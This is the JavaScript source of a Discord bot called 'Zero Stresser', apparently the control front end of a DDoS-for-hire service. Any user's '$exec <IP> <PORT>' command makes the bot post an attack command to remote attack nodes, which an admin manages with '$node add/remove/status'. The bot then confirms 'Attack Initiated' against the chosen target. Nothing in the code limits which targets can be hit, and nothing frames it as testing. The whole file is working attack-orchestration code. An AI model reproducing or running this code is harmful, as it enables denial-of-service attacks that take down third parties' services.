const { Client, GatewayIntentBits, EmbedBuilder, ActivityType } = require('discord.js');
const axios = require('axios');
const config = require('./config');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const IPV4_REGEX = /^(\d{1,3}\.){3}\d{1,3}$/;

function isValidIPv4(ip) {
  if (!IPV4_REGEX.test(ip)) return false;
  return ip.split('.').every(o => parseInt(o) >= 0 && parseInt(o) <= 255);
}

function isValidPort(port) {
  const p = parseInt(port);
  return !isNaN(p) && p >= 1 && p <= 65535;
}

function isAdmin(id) {
  return id === config.adminId;
}

function embed() {
  return new EmbedBuilder().setColor(config.embedColor).setFooter({ text: config.footerText });
}

client.once('ready', () => {
  client.user.setActivity('Zero Stresser', { type: ActivityType.Playing });
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith('$')) return;

  const args = message.content.trim().split(/\s+/);
  const cmd = args[0].toLowerCase();
  const userId = message.author.id;

  try {
    if (cmd === '$exec') {
      const ip = args[1];
      const port = args[2];

      if (!ip || !port) return message.reply('Usage: $exec <IPv4> <PORT>');
      if (!isValidIPv4(ip)) return message.reply('Invalid IPv4 address.');
      if (!isValidPort(port)) return message.reply('Invalid port. Must be between 1 and 65535.');
      if (config.nodes.length === 0) return message.reply('Zero is unavailable at the moment, try again later.');

      const command = `${config.commandConfig.executable} ${config.commandConfig.flags} ${ip} ${port}`;

      Promise.allSettled(
        config.nodes.slice(0, config.maxNodes).map(n =>
          axios.post(`${n.url}/run`, { command }, { timeout: 5000 })
        )
      );

      await new Promise(r => setTimeout(r, 3000));

      return message.reply({
        embeds: [
          embed()
            .setTitle('Attack Initiated')
            .addFields(
              { name: 'Target', value: ip, inline: true },
              { name: 'Port', value: port, inline: true },
              { name: 'Power', value: config.bandwidth, inline: true },
              { name: 'Sent', value: new Date().toUTCString(), inline: false }
            )
        ]
      });
    }

    if (cmd === '$node') {
      if (!isAdmin(userId)) return;

      const sub = args[1];

      if (sub === 'add') {
        const name = args[2];
        const url = args[3];
        if (!name || !url) return message.reply('Usage: $node add <NAME> <URL>');
        if (config.nodes.length >= config.maxNodes) return message.reply(`Maximum of ${config.maxNodes} nodes reached.`);
        config.nodes.push({ name, url });
        return message.reply(`Node "${name}" added. (${config.nodes.length}/${config.maxNodes})`);
      }

      if (sub === 'remove') {
        const name = args[2];
        if (!name) return message.reply('Usage: $node remove <NAME>');
        const i = config.nodes.findIndex(n => n.name === name);
        if (i === -1) return message.reply(`Node "${name}" not found.`);
        config.nodes.splice(i, 1);
        return message.reply(`Node "${name}" removed. (${config.nodes.length}/${config.maxNodes})`);
      }

      if (sub === 'status') {
        if (config.nodes.length === 0) return message.reply('No nodes configured.');
        const list = config.nodes.map((n, i) => `${i + 1}. ${n.name} — ${n.url}`).join('\n');
        return message.reply(`Nodes (${config.nodes.length}/${config.maxNodes}):\n${list}`);
      }

      return message.reply('Usage: $node add|remove|status <NAME> [URL]');
    }

    if (cmd === '$ping') {
      return message.reply({
        embeds: [
          embed().setDescription(`Latency: **${client.ws.ping}ms**`)
        ]
      });
    }

    if (cmd === '$help') {
      return message.reply({
        embeds: [
          embed()
            .setTitle('Zero Stresser')
            .addFields(
              { name: '$exec <IPv4> <PORT>', value: 'Launch an attack on the specified target.', inline: false },
              { name: '$ping', value: 'Show bot latency in ms.', inline: false },
              { name: '$help', value: 'Show this menu.', inline: false }
            )
        ]
      });
    }
  } catch {
    message.reply('An error occurred. Please try again.').catch(() => {});
  }
});

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

client.login(config.token);
